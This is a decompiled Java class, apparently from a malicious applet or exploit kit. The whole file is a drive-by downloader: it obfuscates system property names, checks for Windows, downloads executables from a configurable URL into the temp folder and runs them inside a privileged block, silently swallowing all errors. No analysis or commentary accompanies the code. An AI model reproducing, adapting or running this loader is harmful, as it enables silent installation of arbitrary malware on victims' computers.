// 
// Decompiled by Procyon v0.5.30
// 

package bin.c;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class GetiudeS implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] StringToBytes(final String s) {
        final int n = 2;
        final int n2 = 16;
        final byte[] array = new byte[s.length() / n];
        for (int i = 0; i < s.length(); i += n) {
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
        }
        return array;
    }
    
    @Override
    public Object run() throws Exception {
        if (GetiudeS.data == null) {
            return null;
        }
        try {
            if (System.getProperty("os.nCaCCme".replace("C", "")).indexOf("kkWiknkdkkokwkskk".replace("k", "")) >= 0) {
                int int1 = 1;
                if (GetiudeS.cc != null) {
                    int1 = Integer.parseInt(GetiudeS.cc);
                }
                final int n = 1024;
                for (int i = 0; i < int1; ++i) {
                    final URL url = new URL(GetiudeS.data + Integer.toString(i));
                    url.openConnection();
                    final InputStream openStream = url.openStream();
                    final String string = System.getProperty("java:.io::::.tmp:::::di::r".replace(":", "")) + File.separator + Math.random() + ".exe".replace("M", "");
                    final FileOutputStream fileOutputStream = new FileOutputStream(string);
                    int n2 = 0;
                    int read;
                    while ((read = openStream.read()) != -1) {
                        fileOutputStream.write(read);
                        ++n2;
                    }
                    openStream.close();
                    fileOutputStream.close();
                    if (n2 >= n) {
                        Runtime.getRuntime().exec(string);
                    }
                }
            }
        }
        catch (Exception ex) {}
        return null;
    }
    
    public GetiudeS() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
    
    static {
        GetiudeS.data = null;
        GetiudeS.cc = null;
    }
}
